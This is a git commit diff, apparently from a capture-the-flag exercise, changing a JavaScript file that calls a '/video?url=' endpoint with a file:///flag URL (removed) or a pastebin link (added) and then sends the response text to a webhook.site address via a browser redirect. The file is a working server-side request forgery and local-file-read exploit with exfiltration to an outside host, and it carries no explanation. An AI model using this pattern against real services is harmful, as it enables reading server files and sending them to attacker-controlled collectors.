11709770e8eea14b21cac130904a96eb1613d1ae
Emyr298 <emi.ru298@gmail.com>
2023-12-03 14:55:02 +0700

    s

--- test16.js
+++ test16.js
@@ -1,4 +1,4 @@
-fetch('/video?url=file%3A%2F%2F%2Fflag&format=mp4').then((res) => {
+fetch('/video?url=https%3A%2F%2Fpastebin.com%2Fraw%2F9geFhd9e&format=mp4').then((res) => {
     res.text().then((test) => {
         window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${encodeURIComponent(test)}`;
     }).catch((owo) => {
